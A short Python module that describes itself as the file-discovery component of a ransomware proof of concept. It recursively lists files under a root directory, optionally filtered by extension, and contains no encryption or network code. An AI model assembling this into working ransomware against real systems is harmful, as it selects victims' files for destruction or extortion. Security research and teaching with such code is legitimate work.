# File discovery logic for ransomware PoC
import os
from typing import List, Optional
from ransomware.logging import logger
from ransomware.exceptions import DiscoveryError

class FileDiscoverer:
    """
    Recursively discovers files in a directory tree.
    Optionally filters by file extension.
    """
    def __init__(self, root_dir: str, extensions: Optional[List[str]] = None):
        """
        Initialize the FileDiscoverer with a root directory and optional extensions.
        """
        self.root_dir = root_dir
        self.extensions = [e.lower() for e in extensions] if extensions else None

    def discover_files(self) -> List[str]:
        """
        Return a list of file paths discovered under the root directory.
        If extensions are specified, only files with those extensions are returned.
        """
        files = []
        try:
            for dirpath, _, filenames in os.walk(self.root_dir):
                for filename in filenames:
                    if self.extensions:
                        if not any(filename.lower().endswith(f'.{ext}') for ext in self.extensions):
                            continue
                    full_path = os.path.join(dirpath, filename)
                    files.append(full_path)
            logger.info(f"Discovered {len(files)} files in {self.root_dir}")
            return files
        except Exception as e:
            logger.error(f"Discovery error: {e}")
            raise DiscoveryError(str(e)) 